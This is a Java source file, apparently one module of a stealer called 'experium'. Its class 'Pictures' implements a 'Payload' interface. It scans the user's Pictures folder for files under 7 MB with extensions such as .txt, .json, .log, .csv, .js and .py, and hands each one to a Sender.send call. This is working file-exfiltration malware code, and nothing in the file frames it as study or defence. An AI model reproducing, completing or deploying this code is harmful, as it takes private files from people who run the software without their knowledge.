package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public final
class Pictures implements Payload {
    @Override
    public
    void execute () throws Exception {
        Files.walk(Paths.get(System.getProperty("user.home") + "\\Pictures"))
                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Pictures"))
                .filter(path -> path.toFile().getName().endsWith(".jar")
                        || path.toFile().getName().endsWith(".txt")
                        || path.toFile().getName().endsWith(".json")
                        || path.toFile().getName().endsWith(".yml")
                        || path.toFile().getName().endsWith(".log")
                        || path.toFile().getName().endsWith(".csv")
                        || path.toFile().getName().endsWith(".js")
                        || path.toFile().getName().endsWith(".py"))
                .filter(path -> {
                    try {
                        return Files.size(path) < 7000000;
                    } catch (IOException ignored) {
                    }
                    return false;
                }).forEach(path -> Sender.send(path.toFile()));
    }
}